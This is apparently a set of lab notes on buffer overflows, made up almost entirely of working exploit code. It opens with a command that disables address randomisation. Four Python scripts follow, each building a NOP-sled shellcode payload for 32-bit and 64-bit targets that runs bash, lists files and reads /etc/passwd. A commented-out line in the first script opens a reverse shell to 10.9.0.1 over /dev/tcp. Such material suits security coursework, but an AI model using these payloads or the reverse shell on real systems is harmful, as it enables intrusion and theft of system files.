# Buffer overflow

## Turning off counter measures

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

```python
#!/usr/bin/python3
import sys

shellcode= (
  "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
  "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
  "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd          *"
  # "/bin/bash -i >/dev/tcp/10.9.0.1/7070 0<&1 2>&1              *"  remember to start the server in another terminal through "nc -lnv 7070"
  "AAAA" # Placeholder for argv[0] --> "/bin/bash"
  "BBBB" # Placeholder for argv[1] --> "-c"
  "CCCC" # Placeholder for argv[2] --> the command string
  "DDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# the shellcode goes at the end
content[517 - len(shellcode):] = shellcode

ret    = 0xffffd6c8 + 8   # 0xffffd6c8 is the ebp address printed by the server and it changes after each execution
offset = 112 + 4            # the offset between the base pointer and the buffer address plus the 4 bytes of the base pointer address

# Use 4 for 32-bit address 
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

##

```python
#!/usr/bin/python3
import sys

shellcode= (
  "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
  "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
  "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd          *"
  "AAAA" # Placeholder for argv[0] --> "/bin/bash"
  "BBBB" # Placeholder for argv[1] --> "-c"
  "CCCC" # Placeholder for argv[2] --> the command string
  "DDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# the shellcode goes at the end
content[517 - len(shellcode):] = shellcode

ret    = 0xffffd6c8 + 300     # 0xffffd6c8 is the buffer address printed by the server and it changes at each execution. 300 is the maximum size of the buffer. 

# We literaly fill the whole buffer with the new return address assuming that at some point we will find the correct field to save the return address into
for offset in range(50):
  content[offset*4:offset*4 + 4] = (ret).to_bytes(4,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

##

```python
#!/usr/bin/python3
import sys

# This is the shellcode for 64-bit architecture
shellcode= (
  "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
  "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
  "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
  "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd          *"
  "AAAAAAAA" # Placeholder for argv[0] --> "/bin/bash"
  "BBBBBBBB" # Placeholder for argv[1] --> "-c"
  "CCCCCCCC" # Placeholder for argv[2] --> the command string
  "DDDDDDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# This time the shellcode goes near the beginning of the buffer
start = 40
content[start:start+len(shellcode)] = shellcode

ret    = 0x00007fffffffe450     # 0x00007fffffffe450 is the buffer address printed by the server
offset = 208 + 8

# Use 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

##

```python
#!/usr/bin/python3
import sys

shellcode= (
  "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
  "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
  "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
  "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd          *"
  "AAAAAAAA" # Placeholder for argv[0] --> "/bin/bash"
  "BBBBBBBB" # Placeholder for argv[1] --> "-c"
  "CCCCCCCC" # Placeholder for argv[2] --> the command string
  "DDDDDDDD" # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
content[517 - len(shellcode):] = shellcode

# there is a dummy stack frame between bof and main, which size is about 1000 bytes. We can thus add 1200 bytes to the base pointer address 
ret    = 0x00007fffffffe0e0 + 1200    # 0x00007fffffffe0e0 is the buffer address printed by the server
offset = 96 + 8  #96 is the offset between the base pointer and the buffer

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```